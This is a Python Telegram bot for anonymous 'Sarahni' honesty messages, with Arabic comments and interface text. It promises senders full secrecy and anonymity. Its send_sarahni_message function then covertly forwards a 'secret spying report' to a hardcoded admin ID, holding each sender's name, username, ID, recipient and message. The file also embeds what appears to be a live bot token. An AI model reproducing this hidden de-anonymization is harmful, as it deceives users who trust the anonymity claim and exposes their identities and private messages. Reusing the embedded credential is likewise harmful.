import telebot
import sqlite3

# 1. توكن البوت الخاص بك من BotFather (تم التعديل بنجاح)
API_TOKEN = '8853538663:AAEoQFVkHudDpQG9xtjc2G4aca6Mbm93EqI'

# 2. الآيدي الشخصي تبعك لتصلك التقارير (تم التعديل بنجاح)
ADMIN_ID = 8820368378

bot = telebot.TeleBot(API_TOKEN)

# إنشاء قاعدة بيانات لحفظ روابط المستخدمين
def init_db():
    conn = sqlite3.connect('sarahni.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# التعامل مع رابط الدخول (start)
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    text = message.text.split()
    
    # حفظ المستخدم في قاعدة البيانات
    conn = sqlite3.connect('sarahni.db')
    cursor = conn.cursor()
    cursor.execute('INSERT OR REPLACE INTO users VALUES (?, ?, ?)', 
                   (chat_id, message.from_user.username, message.from_user.first_name))
    conn.commit()
    conn.close()

    # إذا دخل عن طريق رابط صراحة لشخص آخر (مثال: /start 1234567)
    if len(text) > 1:
        target_id = text[1]
        if str(target_id) == str(chat_id):
            bot.send_message(chat_id, "❌ لا يمكنك مصارحة نفسك!")
            return
        
        # نطلب منه إرسال الصراحة
        msg = bot.send_message(chat_id, "✍️ أكتب الآن رسالتك الصريحة بكل أمان وسرية تامة... وسأقوم بإيصالها دون كشف هويتك! 🤫")
        bot.register_next_step_handler(msg, send_sarahni_message, target_id)
    else:
        # الدخول العادي للبوت
        markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(telebot.types.KeyboardButton("🔗 إنشاء رابط الصراحة الخاص بي"))
        bot.send_message(chat_id, "🤖 أهلاً بك في بوت صارحني المطور!\n\nاضغط على الزر بالأسفل لإنشاء رابطك الخاص ونشره لتلقي الرسائل بسرية تامة!", reply_markup=markup)

# عند الضغط على زر إنشاء الرابط
@bot.message_handler(func=lambda message: message.text == "🔗 إنشاء رابط الصراحة الخاص بي")
def create_link(message):
    bot_info = bot.get_me()
    user_link = f"https://t.me/{bot_info.username}?start={message.chat.id}"
    response = (
        f"👑 الرابط الخاص بك جاهز الآن للتلقي:\n\n"
        f"`{user_link}`\n\n"
        f"انشره على حساباتك (سناب، انستا، تيك توك) واستعد لتلقي الصراحات! 🥳🔒"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

# إرسال الصراحة والتقرير الخاص بك
def send_sarahni_message(message, target_id):
    sender_id = message.chat.id
    sender_name = message.from_user.first_name
    sender_username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد يوزر"
    msg_text = message.text

    # جلب بيانات الشخص المستلم
    conn = sqlite3.connect('sarahni.db')
    cursor = conn.cursor()
    cursor.execute('SELECT username, full_name FROM users WHERE user_id = ?', (target_id,))
    target_data = cursor.fetchone()
    conn.close()

    target_name = target_data[1] if target_data else "مستخدم مسجل"
    target_username = f"@{target_data[0]}" if target_data and target_data[0] else "لا يوجد"

    # 1. إرسال الرسالة للمستلم الأصلي (دون كشف الهوية)
    try:
        bot.send_message(target_id, f"📥 **وصلتك رسالة صراحة جديدة!**\n━━━━━━━━━━━━━━━━━━━\n💬 {msg_text}", parse_mode='Markdown')
        bot.send_message(sender_id, "تم إرسال رسالتك بنجاح وبسرية تامة! 🤫🔒")
    except Exception as e:
        bot.send_message(sender_id, "❌ حدث خطأ، يبدو أن المستخدم قام بحظر البوت.")
        return

    # 2. إرسال التقرير السري والتجسس لك (الآدمن) 🔥
    report = (
        f"🕵️‍♂️ **تقرير صراحة جديد:**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **المرسل:** {sender_name}\n"
        f"🔗 **يوزر المرسل:** {sender_username}\n"
        f"🆔 **آيدي المرسل:** `{sender_id}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 **المستلم:** {target_name} ({target_username})\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"💬 **نص الصراحة:**\n{msg_text}"
    )
    try:
        bot.send_message(ADMIN_ID, report, parse_mode='Markdown')
    except Exception as e:
        print(f"فشل إرسال التقرير: {e}")

# تشغيل البوت
bot.infinity_polling()
